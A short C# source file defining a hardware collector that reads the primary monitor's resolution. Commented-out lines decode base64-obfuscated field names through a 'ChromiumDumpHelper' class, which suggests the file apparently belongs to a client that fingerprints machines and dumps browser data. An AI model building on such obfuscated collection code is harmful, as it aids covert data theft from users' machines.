using System;
using System.Windows.Forms;
using System.Runtime.Versioning;
using Titan.NF.Client.Hardware.Contracts;
using System.Runtime.InteropServices;

namespace Titan.NF.Client.Hardware.Collectors
{
	//[SupportedOSPlatform("windows")]
	internal class MonitorHardwareCollector : IHardwareCollector
	{
		[DllImport("user32.dll")]
		private static extern bool SetProcessDPIAware();

		public string[] Collect()
		{
			SetProcessDPIAware();

			Screen screen = Screen.PrimaryScreen;

			int dpiScaledWidth = (int)(screen.Bounds.Width);
			int dpiScaledHeight = (int)(screen.Bounds.Height);

			return new string[] { $"DesktopResolution: {dpiScaledWidth + "x" + dpiScaledHeight}" };
		}

		private static string EncodedName()
		{
			return "";
			//return ChromiumDumpHelper.FromBase64Short("TW9uaXRvck5hbWU=");
		}

		private static string EncodedResolution()
		{
			return "";
			//return ChromiumDumpHelper.FromBase64Short("UmVzb2x1dGlvbg==");
		}
	}
}
